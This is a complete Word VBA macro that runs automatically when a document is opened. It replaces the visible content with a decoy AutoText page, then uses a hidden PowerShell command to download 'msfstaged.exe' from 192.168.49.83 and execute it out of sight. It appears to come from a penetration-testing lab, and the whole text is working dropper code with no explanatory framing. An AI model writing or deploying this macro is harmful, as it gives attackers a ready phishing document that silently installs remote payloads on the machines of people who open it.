Sub Document_Open()
 SubstitutePage
End Sub

Sub AutoOpen()
 SubstitutePage
End Sub

Sub SubstitutePage()
 ActiveDocument.Content.Select
 Selection.Delete
 ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
 Dim str As String
 str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.49.83/msfstaged.exe','msfstaged.exe')"
 Shell str, vbHide
 Dim exePath As String
 exePath = ActiveDocument.Path + "\msfstaged.exe"
 Wait (2)
 Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
 Dim t As Date
 t = Now
 Do
 DoEvents
 Loop Until Now >= DateAdd("s", n, t)
End Sub